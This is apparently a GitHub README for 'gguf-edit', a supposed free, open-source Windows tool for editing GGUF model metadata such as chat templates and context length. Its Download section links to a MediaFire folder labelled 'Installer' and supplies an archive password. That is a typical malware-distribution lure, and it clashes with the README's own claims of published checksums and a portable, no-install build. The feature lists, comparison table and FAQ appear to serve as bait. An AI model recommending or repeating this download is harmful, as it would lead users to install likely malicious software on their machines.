# gguf-edit

📝 Free, open-source GGUF metadata editor for Windows — change chat template, system prompt and params without requanting. 100 MB MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Edit without requanting** — chat template, system prompt, stop tokens and context length written in place, weights untouched
- ✅ **Template library** — built-in Jinja and ChatML presets with a live render preview against sample messages
- ✅ **Header diff view** — original and modified KV pairs side by side before saving
- ✅ **Safe writes** — every edit creates a copy by default, with optional in-place patch mode for large files
- ✅ **Parameter tuning** — rope scaling, sliding window, attention flags exposed with plain-language hints
- ✅ **Shard awareness** — edits apply to split GGUF sets as one logical model
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why gguf-edit

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **gguf-edit** | gguf-py scripts | LM Studio | KoboldCpp |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Free | Free, OSS |
| Open source | **Yes** | Yes | No | Yes |
| GUI metadata editing | **Yes** | No | No | No |
| Template render preview | **Yes** | No | Partial | No |
| Header diff before save | **Yes** | No | No | No |
| Portable, no install | **Yes, 100 MB** | Scripts | Installer | Zip |

## FAQ

**how to change the chat template in a GGUF file?**

A wrong template is why a local model answers like a brick, yet fixing it normally means Python scripts that rewrite the header by hand. gguf-edit exposes the KV pairs with a live render preview and writes changes without requanting the weights. It is a 100 MB portable exe, MIT, offline, and it edits a copy by default.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark editor (#121418, violet #C084FC): KV table left with tokenizer.chat_template highlighted, template text area right, render preview panel below.
2. Diff view: three changed keys listed with old and new values, save-copy button enabled, in-place patch toggle off with warning chip.
3. Parameters tab: context length field at 8192, rope scaling dropdown, sliding window toggle, plain-language hint text under each control.

## Download

| Source | Link |
|---|---|
| 💾 **Installer gguf-edit** | [Installer gguf-edit](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).